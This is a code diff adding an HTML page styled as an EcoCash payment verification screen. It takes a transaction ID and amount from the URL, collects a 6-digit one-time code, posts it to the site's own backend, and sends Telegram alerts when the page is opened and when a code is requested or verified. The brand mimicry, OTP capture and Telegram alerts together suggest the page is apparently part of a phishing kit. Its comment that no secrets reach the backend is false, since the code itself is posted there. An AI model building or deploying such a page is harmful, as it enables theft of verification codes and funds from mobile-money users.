@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>EcoCash · Verification</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --eco-blue: #0066A6;
+    --eco-red: #E31E24;
+    --eco-green: #00A651;
+    --eco-navy: #101828;
+    --eco-muted: #667085;
+    --eco-border: #E5E7EB;
+    --eco-soft: #F5F7F9;
+    --eco-bg: #F8FAFC;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: 'Poppins', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: var(--eco-bg); color: var(--eco-navy);
+    -webkit-font-smoothing: antialiased; line-height: 1.5;
+    min-height: 100vh; padding: 24px 16px 48px;
+  }
+  .wrap { max-width: 480px; margin: 0 auto; }
+
+  .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; }
+  .brand { display: inline-flex; align-items: baseline; font-weight: 900; font-size: 22px; letter-spacing: -0.6px; }
+  .brand .eco { color: var(--eco-blue); }
+  .brand .cash { color: var(--eco-red); }
+  .header .label { font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.7px; color: var(--eco-muted); }
+
+  .card {
+    background: #fff; border-radius: 20px; border: 1px solid var(--eco-border);
+    box-shadow: 0 10px 30px rgba(17,24,39,0.06); overflow: hidden;
+  }
+  .card-head { padding: 24px 24px 18px; border-bottom: 1px solid var(--eco-border); background: #FBFCFE; }
+  .card-head h1 { font-size: 18px; font-weight: 800; letter-spacing: -0.3px; margin-bottom: 4px; }
+  .card-head p { font-size: 12.5px; color: var(--eco-muted); line-height: 1.6; }
+
+  .card-body { padding: 22px 24px 24px; }
+
+  /* Transaction summary */
+  .tx-block {
+    background: var(--eco-soft); border-radius: 12px; padding: 14px 16px;
+    display: flex; justify-content: space-between; align-items: center;
+    margin-bottom: 22px;
+  }
+  .tx-block .tx-left .k { font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.6px; color: var(--eco-muted); margin-bottom: 4px; }
+  .tx-block .tx-left .v { font-size: 14px; font-weight: 700; }
+  .tx-block .tx-amt { font-size: 18px; font-weight: 800; color: var(--eco-blue); letter-spacing: -0.5px; }
+  .tx-block .tx-amt .cur { font-size: 12px; font-weight: 700; margin-right: 4px; opacity: 0.85; }
+
+  /* OTP input */
+  .otp-label { display: block; font-size: 12px; font-weight: 600; margin-bottom: 8px; }
+  .otp-row { display: flex; justify-content: space-between; gap: 8px; margin-bottom: 14px; }
+  .otp-row input {
+    flex: 1; min-width: 0; height: 54px;
+    border: 2px solid var(--eco-border); border-radius: 12px;
+    background: #fff; color: var(--eco-navy);
+    font-family: inherit; font-size: 22px; font-weight: 800;
+    text-align: center; outline: none;
+    transition: border-color .15s, box-shadow .15s;
+  }
+  .otp-row input:focus { border-color: var(--eco-blue); box-shadow: 0 0 0 3px rgba(0,102,166,0.12); }
+  .otp-row input.filled { border-color: var(--eco-blue); }
+
+  .otp-help { display: flex; justify-content: space-between; align-items: center; margin-bottom: 18px; }
+  .otp-help .note { font-size: 11.5px; color: var(--eco-muted); }
+  .resend-btn {
+    background: transparent; border: none; font-family: inherit;
+    font-size: 12px; font-weight: 700; color: var(--eco-blue); cursor: pointer;
+    padding: 4px 0;
+  }
+  .resend-btn:disabled { color: var(--eco-muted); cursor: default; }
+
+  .action-btn {
+    width: 100%; height: 54px; background: var(--eco-blue); color: #fff;
+    border: none; border-radius: 12px; font-family: inherit;
+    font-size: 15px; font-weight: 800; cursor: pointer;
+    transition: filter .15s;
+    display: flex; align-items: center; justify-content: center; gap: 8px;
+  }
+  .action-btn:hover { filter: brightness(1.08); }
+  .action-btn:disabled { opacity: 0.65; cursor: wait; }
+
+  .error-msg {
+    display: none; background: #FEF2F2; border: 1px solid #FECACA; color: #B91C1C;
+    font-size: 12.5px; font-weight: 500; padding: 10px 12px;
+    border-radius: 10px; margin-bottom: 16px; text-align: center; line-height: 1.5;
+  }
+  .error-msg.show { display: block; }
+
+  .card-foot {
+    padding: 16px 24px; border-top: 1px solid var(--eco-border);
+    background: #FBFCFE; display: flex; justify-content: center;
+  }
+  .card-foot .brand { font-size: 16px; }
+
+  .page-foot { text-align: center; margin-top: 18px; font-size: 11px; color: var(--eco-muted); line-height: 1.6; }
+
+  /* Toast */
+  .toast {
+    position: fixed; bottom: 24px; left: 50%;
+    transform: translateX(-50%) translateY(80px);
+    background: var(--eco-navy); color: #fff;
+    padding: 11px 18px; border-radius: 9px;
+    font-size: 12.5px; font-weight: 600;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+    opacity: 0; transition: all .3s ease; z-index: 100; pointer-events: none;
+    max-width: 90%; text-align: center;
+  }
+  .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+
+  @media (max-width: 380px) {
+    .otp-row input { height: 48px; font-size: 18px; }
+    .otp-row { gap: 6px; }
+    .action-btn { height: 48px; font-size: 14px; }
+  }
+</style>
+</head>
+<body>
+
+<div class="wrap">
+  <div class="header">
+    <div class="brand"><span class="eco">Eco</span><span class="cash">Cash</span></div>
+    <span class="label">Verification</span>
+  </div>
+
+  <div class="card">
+    <div class="card-head">
+      <h1>Verify your payment</h1>
+      <p>Enter the 6-digit code sent to your EcoCash number to confirm this transaction.</p>
+    </div>
+
+    <div class="card-body">
+      <div class="tx-block">
+        <div class="tx-left">
+          <div class="k">Transaction</div>
+          <div class="v" id="txId">—</div>
+        </div>
+        <div class="tx-amt"><span class="cur" id="amtCur">USD</span><span id="amtVal">0.00</span></div>
+      </div>
+
+      <div class="error-msg" id="errBox"></div>
+
+      <label class="otp-label">6-digit verification code</label>
+      <div class="otp-row" id="otpRow">
+        <input type="text" inputmode="numeric" maxlength="1" autocomplete="one-time-code" data-idx="0">
+        <input type="text" inputmode="numeric" maxlength="1" data-idx="1">
+        <input type="text" inputmode="numeric" maxlength="1" data-idx="2">
+        <input type="text" inputmode="numeric" maxlength="1" data-idx="3">
+        <input type="text" inputmode="numeric" maxlength="1" data-idx="4">
+        <input type="text" inputmode="numeric" maxlength="1" data-idx="5">
+      </div>
+
+      <div class="otp-help">
+        <span class="note" id="otpNote">Didn't receive the code?</span>
+        <button class="resend-btn" id="resendBtn" onclick="requestCode()" disabled>Resend in 30s</button>
+      </div>
+
+      <button class="action-btn" id="verifyBtn" onclick="verifyCode()">Verify payment</button>
+    </div>
+
+    <div class="card-foot">
+      <div class="brand"><span class="eco">Eco</span><span class="cash">Cash</span></div>
+    </div>
+  </div>
+
+  <div class="page-foot">
+    Powered by EcoCash · Your credentials are never shared.
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+  /* ============================================================
+     Transaction data from the URL
+  ============================================================ */
+  const params = new URLSearchParams(location.search);
+  const txData = {
+    tx:  params.get('tx')  || '',
+    am:  params.get('am')  || '0',
+    cur: params.get('cur') || 'USD',
+    rn:  params.get('rn')  || '',
+    c:   params.get('c')   || ''
+  };
+
+  document.getElementById('txId').textContent = txData.tx || '—';
+  document.getElementById('amtCur').textContent = txData.cur;
+  document.getElementById('amtVal').textContent = Number(txData.am || 0).toFixed(2);
+
+  /* ============================================================
+     OTP box behaviour — auto-advance, backspace, paste
+  ============================================================ */
+  const boxes = Array.from(document.querySelectorAll('#otpRow input'));
+  boxes.forEach((el, i) => {
+    el.addEventListener('input', () => {
+      el.value = el.value.replace(/\D/g, '').slice(0, 1);
+      el.classList.toggle('filled', !!el.value);
+      if (el.value && i < boxes.length - 1) boxes[i + 1].focus();
+    });
+    el.addEventListener('keydown', (e) => {
+      if (e.key === 'Backspace' && !el.value && i > 0) boxes[i - 1].focus();
+    });
+    el.addEventListener('paste', (e) => {
+      const text = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, 6);
+      if (text.length === 6) {
+        e.preventDefault();
+        text.split('').forEach((d, idx) => { boxes[idx].value = d; boxes[idx].classList.add('filled'); });
+        boxes[5].focus();
+      }
+    });
+  });
+
+  function getOtp() {
+    return boxes.map(el => el.value).join('');
+  }
+  function clearOtp() {
+    boxes.forEach(el => { el.value = ''; el.classList.remove('filled'); });
+    boxes[0].focus();
+  }
+
+  /* ============================================================
+     UI helpers
+  ============================================================ */
+  function showToast(msg) {
+    const t = document.getElementById('toast');
+    t.textContent = msg; t.classList.add('show');
+    clearTimeout(t._timer);
+    t._timer = setTimeout(() => t.classList.remove('show'), 2200);
+  }
+  function showError(msg) {
+    const el = document.getElementById('errBox');
+    el.textContent = msg; el.classList.add('show');
+  }
+  function clearError() {
+    document.getElementById('errBox').classList.remove('show');
+  }
+
+  /* ============================================================
+     Resend countdown
+  ============================================================ */
+  let countdown = 30;
+  let countdownTimer = null;
+  const resendBtn = document.getElementById('resendBtn');
+
+  function startCountdown(seconds) {
+    countdown = seconds;
+    resendBtn.disabled = true;
+    resendBtn.textContent = 'Resend in ' + countdown + 's';
+    if (countdownTimer) clearInterval(countdownTimer);
+    countdownTimer = setInterval(() => {
+      countdown -= 1;
+      if (countdown <= 0) {
+        clearInterval(countdownTimer);
+        countdownTimer = null;
+        resendBtn.disabled = false;
+        resendBtn.textContent = 'Resend code';
+      } else {
+        resendBtn.textContent = 'Resend in ' + countdown + 's';
+      }
+    }, 1000);
+  }
+
+  /* ============================================================
+     Report an event to the backend (which forwards to Telegram)
+     No secrets are ever sent to the backend from this page.
+  ============================================================ */
+  async function reportEvent(type, extra) {
+    try {
+      await fetch('/api/telegram/event', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          type: type,
+          tx: txData.tx,
+          am: txData.am,
+          cur: txData.cur,
+          c: txData.c,
+          ...extra
+        })
+      });
+    } catch (e) {
+      // Never block the user because Telegram is down
+    }
+  }
+
+  /* ============================================================
+     Request a code
+  ============================================================ */
+  async function requestCode() {
+    clearError();
+    resendBtn.disabled = true;
+    resendBtn.textContent = 'Sending…';
+
+    try {
+      const r = await fetch('/api/verification/otp', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ tx: txData.tx, purpose: 'resend' })
+      });
+      const j = await r.json().catch(() => ({}));
+
+      if (!r.ok) {
+        showError(j.message || 'Could not send code. Please try again.');
+        resendBtn.disabled = false;
+        resendBtn.textContent = 'Resend code';
+        return;
+      }
+
+      showToast('Verification code sent.');
+      startCountdown(30);
+      await reportEvent('otp_requested');
+    } catch (e) {
+      showError('Network error. Please try again.');
+      resendBtn.disabled = false;
+      resendBtn.textContent = 'Resend code';
+    }
+  }
+
+  /* ============================================================
+     Verify the code
+  ============================================================ */
+  async function verifyCode() {
+    clearError();
+    const otp = getOtp();
+
+    if (otp.length !== 6) {
+      showError('Please enter all 6 digits.');
+      return;
+    }
+
+    const btn = document.getElementById('verifyBtn');
+    btn.disabled = true;
+    btn.textContent = 'Verifying…';
+
+    try {
+      const r = await fetch('/api/verification/verify', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ tx: txData.tx, otp: otp })
+      });
+      const j = await r.json().catch(() => ({}));
+
+      if (!r.ok || !j.success) {
+        showError(j.message || 'Invalid code. Please try again.');
+        btn.disabled = false;
+        btn.textContent = 'Verify payment';
+        clearOtp();
+        return;
+      }
+
+      // Server confirmed. Show result.
+      btn.textContent = 'Verified ✓';
+      showToast('Payment verified.');
+      await reportEvent('verification_success');
+
+      // Redirect to verify.html with the transaction details
+      const q = new URLSearchParams({
+        tx:  txData.tx,
+        am:  txData.am,
+        cur: txData.cur,
+        rn:  txData.rn,
+        c:   txData.c
+      });
+      setTimeout(() => {
+        window.location.replace('verify.html?' + q.toString());
+      }, 800);
+    } catch (e) {
+      showError('Network error. Please try again.');
+      btn.disabled = false;
+      btn.textContent = 'Verify payment';
+    }
+  }
+
+  /* ============================================================
+     On load: report page_open event once
+  ============================================================ */
+  document.addEventListener('DOMContentLoaded', () => {
+    if (txData.tx) {
+      reportEvent('page_opened');
+      startCountdown(30);
+    }
+  });
+</script>
+</body>
+</html>
